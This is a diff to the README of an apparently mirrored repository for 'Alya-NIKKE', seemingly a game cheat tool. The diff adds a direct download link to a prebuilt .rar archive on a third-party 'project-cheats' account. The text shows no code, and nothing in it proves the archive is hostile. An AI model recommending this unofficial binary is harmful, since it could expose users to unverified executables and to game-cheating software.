@@ -3,7 +3,7 @@
 > **Mirrored copy.** Original source: <https://github.com/0xCiel/Alya-NIKKE>
 > All credit to **0xCiel** and the Alya project — this repository does not own or maintain it.
 
-> **Download:** [Alya — NIKKE release](https://github.com/0xHasan97/project-cheats/releases/tag/alya-nikke-v1.0) — documentation folder bundle plus `SHA256SUMS.txt`.
+> **Download:** [Alya — NIKKE release](https://github.com/0xHasan97/project-cheats/releases/tag/alya-nikke-v1.0) — latest build [`Alya-NIKKE-0.1.8.rar`](https://github.com/0xHasan97/project-cheats/releases/download/alya-nikke-v1.0/Alya-NIKKE-0.1.8.rar) (upstream `0.1.8`), plus the documentation bundle and `SHA256SUMS.txt`.
 
 <p align="center"><img src="screenshots/banner.png" width="420"/></p>
 
